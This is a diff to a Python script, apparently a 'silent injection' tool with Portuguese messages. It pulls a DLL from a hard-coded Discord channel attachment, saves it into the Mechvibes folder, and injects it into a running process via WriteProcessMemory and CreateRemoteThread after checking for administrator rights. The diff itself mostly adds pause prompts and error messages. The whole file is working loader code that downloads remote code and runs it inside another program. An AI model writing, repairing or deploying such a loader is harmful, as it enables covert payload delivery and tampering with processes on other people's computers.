@@ -8,6 +8,7 @@ def log(msg):
     print(f"[LOG] {msg}")
 
 def execute_silent_injection():
+    print("="*60)
     log("Iniciando execução da injeção silenciosa...")
 
     try:
@@ -16,11 +17,12 @@ def execute_silent_injection():
     except ImportError:
         log("Módulo 'requests' não encontrado. Instalando...")
         try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
             import requests
             log("Módulo 'requests' instalado com sucesso.")
         except Exception as e:
             log(f"Erro ao instalar 'requests': {e}")
+            input("\nPressione Enter para sair...")
             return
 
     DISCORD_CHANNEL_ID = "1393441968566046750"
@@ -53,10 +55,12 @@ def execute_silent_injection():
     log("Verificando permissões de administrador...")
     try:
         if not ctypes.windll.shell32.IsUserAnAdmin():
-            log("Permissão de administrador necessária. Encerrando.")
+            log("Permissão de administrador necessária. Execute como administrador.")
+            input("\nPressione Enter para sair...")
             return
     except Exception as e:
         log(f"Erro ao verificar administrador: {e}")
+        input("\nPressione Enter para sair...")
         return
 
     if sys.maxsize > 2**32:
@@ -64,10 +68,12 @@ def execute_silent_injection():
         try:
             subprocess.Popen(['py', '-3-32'] + sys.argv, creationflags=0x08000008)
             log("Reaberto em 32 bits. Encerrando esta instância.")
+            input("\nPressione Enter para sair...")
             sys.exit()
         except FileNotFoundError:
             log("Python 32 bits não encontrado.")
-            pass
+            input("\nPressione Enter para sair...")
+            return
 
     log("Procurando pasta do Mechvibes...")
     mech_dir = None
@@ -82,6 +88,7 @@ def execute_silent_injection():
 
     if not mech_dir:
         log("Pasta do Mechvibes não encontrada.")
+        input("\nPressione Enter para sair...")
         return
 
     dll_path = os.path.join(mech_dir, DLL_NAME)
@@ -95,13 +102,17 @@ def execute_silent_injection():
         )
         if r_msg.status_code != 200:
             log(f"Erro ao buscar mensagem: status {r_msg.status_code}")
+            input("\nPressione Enter para sair...")
             return
+
         messages = r_msg.json()
         if not messages or not messages[0].get('attachments'):
             log("Nenhuma mensagem com anexo encontrada.")
+            input("\nPressione Enter para sair...")
             return
+
         dll_url = messages[0]['attachments'][0]['url']
-        log(f"URL do DLL obtido: {dll_url}")
+        log(f"URL da DLL obtido: {dll_url}")
         r_dll = requests.get(dll_url, timeout=15)
         if r_dll.status_code == 200:
             with open(dll_path, "wb") as f:
@@ -109,9 +120,11 @@ def execute_silent_injection():
             log(f"DLL salva em: {dll_path}")
         else:
             log(f"Falha ao baixar DLL: status {r_dll.status_code}")
+            input("\nPressione Enter para sair...")
             return
     except requests.exceptions.RequestException as e:
         log(f"Erro na requisição da DLL: {e}")
+        input("\nPressione Enter para sair...")
         return
 
     log(f"Procurando processo '{PROCESS_NAME}'...")
@@ -121,11 +134,13 @@ def execute_silent_injection():
         log(f"Processo encontrado. PID: {pid}")
     except Exception as e:
         log(f"Erro ao obter PID do processo: {e}")
+        input("\nPressione Enter para sair...")
         return
 
     h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
     if not h_process:
         log("Falha ao abrir processo.")
+        input("\nPressione Enter para sair...")
         return
     else:
         log("Handle do processo obtido com sucesso.")
@@ -136,11 +151,13 @@ def execute_silent_injection():
     if not mem_addr:
         log("Falha ao alocar memória remota.")
         k32.CloseHandle(h_process)
+        input("\nPressione Enter para sair...")
         return
 
     if not k32.WriteProcessMemory(h_process, mem_addr, dll_bytes, len(dll_bytes) + 1, None):
         log("Falha ao escrever na memória do processo.")
         k32.CloseHandle(h_process)
+        input("\nPressione Enter para sair...")
         return
 
     log("DLL escrita na memória do processo.")
@@ -151,6 +168,7 @@ def execute_silent_injection():
     if not h_thread:
         log("Falha ao criar thread remota.")
         k32.CloseHandle(h_process)
+        input("\nPressione Enter para sair...")
         return
 
     log("Thread remota criada com sucesso. Injeção concluída.")
@@ -158,5 +176,7 @@ def execute_silent_injection():
     k32.CloseHandle(h_thread)
     k32.CloseHandle(h_process)
     log("Handles liberados. Processo finalizado com sucesso.")
+    print("="*60)
+    input("\n✅ Pressione Enter para sair manualmente...")
 
 execute_silent_injection()
